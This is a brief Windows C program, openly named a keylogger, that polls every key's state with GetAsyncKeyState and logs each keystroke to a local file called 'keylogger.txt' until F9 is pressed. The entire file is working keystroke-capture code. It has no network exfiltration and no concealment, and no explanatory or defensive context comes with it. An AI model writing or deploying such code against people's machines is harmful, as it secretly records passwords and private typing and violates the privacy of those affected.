#include <stdio.h>
#include <windows.h>
#define WIN32_LEAN_AND_MEAN

int main() {
    FILE *file = fopen("keylogger.txt", "w");
    if (file == NULL)
        return 1;

    for (int i = 0; i < 256; i++)
        GetAsyncKeyState(i);
        
    while (!(GetAsyncKeyState(VK_F9) & 0b1)) {

        for (int i = 0; i < 256; i++) {
            
            if (GetAsyncKeyState(i) & 0b1) {
                switch (i) {
                    case VK_ESCAPE: fprintf(file, "\n%s", "[ESCAPE]"); break;
                    case VK_RETURN: fprintf(file, "\n"); break;
                    case VK_SPACE: fprintf(file, " "); break;
                    default:
                        if (i >= 32 && i <= 126)
                            fprintf(file, "%c", (char)i);
                        break;
                }
                fflush(file);
            }
        }
        Sleep(5);
    }
    fclose(file);
    return 0;
}
